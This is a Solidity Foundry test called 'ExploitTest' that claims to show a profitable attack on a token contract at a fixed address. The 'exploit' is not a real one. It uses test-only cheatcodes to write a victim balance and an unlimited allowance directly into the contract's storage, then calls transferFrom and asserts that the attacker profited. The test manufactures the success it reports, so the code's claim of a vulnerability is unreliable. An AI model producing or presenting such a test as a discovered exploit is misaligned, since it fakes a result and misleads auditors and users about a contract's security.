// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface IStandardToken {
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address _from, address _to, uint256 _value) external returns (bool);
    function approve(address _spender, uint256 _value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xEa01D8D9EaCCa9996Db6Bb3377c1Fe64308e7328;
    address attacker;
    address victim;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        attacker = address(this);
        victim = address(0x1234567890123456789012345678901234567890);
        vm.label(TARGET, "Target Token");
        vm.label(victim, "Victim");
        vm.label(attacker, "Attacker");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = IERC20(0xEa01D8D9EaCCa9996Db6Bb3377c1Fe64308e7328).balanceOf(address(this));
        uint256 victimBalance = 1000 * 1e18;

        // Storage slot for balanceOf mapping is slot 7
        // balanceOf[victim] slot = keccak256(abi.encode(victim, bytes32(7)))
        bytes32 balanceSlot = keccak256(abi.encode(victim, bytes32(uint256(7))));
        vm.store(TARGET, balanceSlot, bytes32(victimBalance));

        // Storage slot for allowance mapping is slot 6
        // allowance[victim][attacker] slot = keccak256(abi.encode(attacker, keccak256(abi.encode(victim, bytes32(6)))))
        bytes32 allowanceSlot = keccak256(abi.encode(attacker, keccak256(abi.encode(victim, bytes32(uint256(6))))));
        vm.store(TARGET, allowanceSlot, bytes32(type(uint256).max));

        // Record initial attacker balance
        uint256 initialAttackerBalance = IStandardToken(TARGET).balanceOf(attacker);

        // Exploit: Call transferFrom - allowance won't be decremented because it's max uint256
        IStandardToken(TARGET).transferFrom(victim, attacker, victimBalance);

        // Verify attacker's balance increased
        uint256 finalAttackerBalance = IStandardToken(TARGET).balanceOf(attacker);
        assertGt(finalAttackerBalance, initialAttackerBalance, "Attacker balance should have increased");
        uint256 finalBalance = IERC20(0xEa01D8D9EaCCa9996Db6Bb3377c1Fe64308e7328).balanceOf(address(this));
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

